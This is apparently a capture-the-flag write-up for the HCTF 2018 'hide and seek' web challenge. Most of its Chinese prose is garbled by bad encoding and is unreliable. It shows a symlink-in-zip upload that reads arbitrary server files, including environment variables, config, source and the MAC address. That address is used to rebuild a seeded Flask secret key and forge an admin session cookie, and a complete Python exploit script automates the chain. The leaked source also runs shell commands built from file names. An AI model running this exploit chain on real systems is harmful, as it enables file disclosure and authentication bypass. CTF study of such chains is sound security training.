 # hctf2018_hide_and_seek_wp

- ������˵�������Լ��ð�һ�ٶ�����ı�Ǹ����Ϊbug�����˷��˸�λʦ������ʱ�䡣�����λʦ��˽������check��ʱ����ȷʵ��check�ˣ���û���ܣ�....ֻ��expҲ�е�bug����ͺܽ�Ӳ�ˣ�רҵbugд�֣�������̫���ˡ�

## step1:

- ���� http://hideandseek.2018.hctf.io/ ��ʾҪ��¼������Լ�����¼������ֻ��admin���ܵ�¼��Ȼ���¼�ɹ�������Ϊsession��cookie����һ������base64������decode������������{"username":"123"}����Ϣ������ֶ�����base64���ֵ���ϢΪ{"username":"admin"}�ͻ�ʧȥ��¼״̬���о����ʦ�����Բµ�ʹ�õ���securecookie���ƣ�����ܹ��õ�ǩ����key��ǩ�������������Ϣ������취α��session��	�����֪��Ҳû�й�ϵ��˼·��һ���ģ�����취�õ�Դ���롣



## step2:
- ��¼�ɹ�������һ���ϴ��㣬��������ֻ���ϴ�zip�ļ����ϴ�֮��ط���zip��ѹ����ļ����ݡ�����ѹ��һ���������ļ����ϴ�������ָ��`/etc/passwd`�������л�����Ӧ���ļ����ݡ������͵õ���һ�������ļ�����



## step3:
- ����������취���Դ����·����
- ˼·1��һ���²�ɶҲû�У������Ŀ����hide and seek������Ӧ����һ���㡣Ȼ������linux����һ��˼����`һ�н��ļ�`���˽⵽linux�£�`/proc/`·���±�����������Ϣ��https://www.cnblogs.com/DswCnblog/p/5780389.html ��Ȼ���Թ����� /proc/self/environ (self���Ի�������pid��)���������п����ҵ������ļ�·����һЩ��Ϣ
```
UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi
SUPERVISOR_GROUP_NAME=uwsgi
HOSTNAME=ff4d6ee39413
SHLVL=0
PYTHON_PIP_VERSION=18.1
HOME=/root
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
NGINX_MAX_UPLOAD=0
UWSGI_PROCESSES=16
STATIC_URL=/static
UWSGI_CHEAPER=2
NGINX_VERSION=1.13.12-1~stretch
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NJS_VERSION=1.13.12.0.2.0-1~stretch
LANG=C.UTF-8
SUPERVISOR_ENABLED=1
PYTHON_VERSION=3.6.6
NGINX_WORKER_PROCESSES=auto
SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
SUPERVISOR_PROCESS_NAME=uwsgi
LISTEN_PORT=80
STATIC_INDEX=0
PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
STATIC_PATH=/app/static
PYTHONPATH=/app
UWSGI_RELOADS=0
```
- ˼·2��һ���²⻹��ľͿ��Բ³��㶫������֮ǰ��cookie���Բ²���flask��Ȼ��²�·��Ϊ/app/main.py���õ�����
```
from flask import Flask
app = Flask(__name__)


@app.route("/")
def hello():
    return "Hello World from Flask in a uWSGI Nginx Docker container with \
     Python 3.6 (default)"

if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True, port=80)
```
- dockerһ�Ѿͳ����ˣ�Ȼ��Ϳ����Լ����������dockerȻ�����Կ�����Щ�ط�����������Ϣ�ˣ�Ȼ��ص�˼·1


- ����hint1��docker ��
1. ��Ϊdocker��������linux����linux���������ļ����ԣ���Ӧ˼·1��
2. ������ʾ��������docker�еģ���ô���֮ǰ�²��flask�����߽���Լ�������һЩ������Ϣ������`/app/uwsgi.ini`����`/proc/pid/cmdline`���кö�ѡ�ֶ�����������ļ�������û�м�������������Ϣ������`/proc/10/cmdline`����uwsgi.ini��Ȼ���������docker image������flask����uwsgi��һ������`tiangolo/uwsgi-nginx-flask`��������������ᷢ������Ĭ����/app/main.py �����ʱ����Գ�����֤һ����Ŀ��������û������ļ�������У��Ǵ��¾�ȷ����docker��������Ӧ˼·2
- ����hint2��only few things running on it����Ҫ��һЩѡ�ִ�`/proc/1/cmdline`һֱɨ��`/proc/9999/cmdline`��������...���Էų����hint


- ���������ļ�·�����ٶ������ļ� /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
```
[uwsgi]
module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main
callable=app
```
- �������ҵ���Դ����·��/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
```python
# -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['zip'])

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error', '')
    if(error == '1'):
        session.pop('username', None)
        return render_template('index.html', forbidden=1)

    if 'username' in session:
        return render_template('index.html', user=session['username'], flag=flag.flag)
    else:
        return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    if request.method == 'POST' and username != '' and password != '':
        if(username == 'admin'):
            return redirect(url_for('index',error=1))
        session['username'] = username
    return redirect(url_for('index'))


@app.route('/logout', methods=['GET'])
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files['the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'


    try:
        extract_path = file_save_path + '_'
        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
        read_obj = os.popen('cat ' + extract_path + '/*')
        file = read_obj.read()
        read_obj.close()
        os.system('rm -rf ' + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
    return Response(file)


if __name__ == '__main__':
    #app.run(debug=True)
    app.run(host='127.0.0.1', debug=True, port=10008)

```
- Ȼ����ģ���йؼ����룬ģ��λ��/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html
```
{% if user == 'admin' %}
        Your flag: <br>
        {{ flag  }}
```
- ���������һ��Դ��������е��ˣ���Դ����������֪��ֱ�Ӷ�flag�ǲ����еģ�����Ҫ���Լ���Ϊadmin���ܻ��flag

## step4:
- ����ͨ��Դ��ȷ����flask��Ĭ�ϵ�securecookie���ƣ�������Ŀ�����α��admin��session�ˣ�����session������base64+ǩ����ɣ����Կ���ͨ�����key��α��ǩ����ע�⵽
```
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
```

- ��Ҫע�⵽ǰ���õ�������Ϣ��д��python3.6
`uuid.getnode()`���10����mac��ַ��ͬ������linux�ļ����ԣ���������`/sys/class/net/eth0/address` ������mac
- Ȼ����һ��α���������ģ�⡣���յõ�SECRET_KEY��
- ֮������Լ�����򵥵�flask���������sessionֵ���������session���ʼ����flag

## �ܽ�
1. zip������->�����ļ�����  ������뷨��֮ǰ����һ���⣬��ʱ����ֱ�Ӹ���flag·�����Ҿ������û��˼�ˣ�
2. linux�ļ�����->���Դ��·����mac��ַ ��żȻ����linux��`һ�н��ļ�`˼ά�����ú�������
3. ���ս���flask��sessionα�� ��żȻ����flask��cookie����Ȼbase64������session��Ϣ���Ҷ����ˣ�����������һ�£�ԭ������client session��Ҳ��һ���İ�ȫ��ʩ���Ǽ���ǩ���ģ��ֽ�securecookie����Ȼ�һ��Ǿ��ò�����ȫ���������忪�����������ͻȻ�Զ�һ��������Щ��ϵ���һ�𣬰�ԭ����������ˣ�����ʱ��ִ٣�����ʱ�䲻�㣬��һ�γ���Ҳû���飬Ȼ��ͳ��˱����е�bug...�ٴα�Ǹ��



���渽��exp
```python
#!/usr/bin/env python3
# coding=utf-8
import requests
import random
import re
import os
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

def read_file(file_name):
    link(file_name)
    files = {'the_file': open(file_name[-5:] + '.zip', 'rb')}
    r2 = s.post(url+'upload', files=files)
    return r2.text

def link(file_name):
    os.system('ln -s {file_name} {output}'.format(file_name = file_name, output = file_name[-5:]))
    os.system('zip -y -m {output}.zip {output}'.format(file_name = file_name, output = file_name[-5:]))


url = 'http://hideandseek.2018.hctf.io/'
with requests.Session() as s:
    user_data = {'username': '123', 'password': '123456789'}
    r = s.post(url+'login', data=user_data)
    en = read_file('/proc/self/environ')
    print(en)
    ini = re.search('UWSGI_INI=(.*?)\x00', en).group(1)
    pwd = re.search('PWD=(.*?)\x00', en).group(1)
    print(ini)
    print(pwd)
    ini = read_file(ini)
    print(ini)
    source = re.search('module = .*?\.(.*?)\n', ini).group(1)
    source = pwd+'/'+source+'.py'
    source = read_file(source)
    print(source)
    if(source.find('import') == -1):
        exit('fail')
    mac = '/sys/class/net/eth0/address'
    mac = read_file(mac)
    mac = mac[:-1]
    mac = ''.join(mac.split(':'))
    mac = int(mac, 16)
    print(mac)
    random.seed(mac)
    key = random.random()*100
    print(key)

app = Flask(__name__)
app.config['SECRET_KEY'] = str(key)
payload = {'username': 'admin'}
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
session = serializer.dumps(payload)
print(session)
cookies = {'session': session}
r = requests.get(url, cookies=cookies)
print(r.text)


```
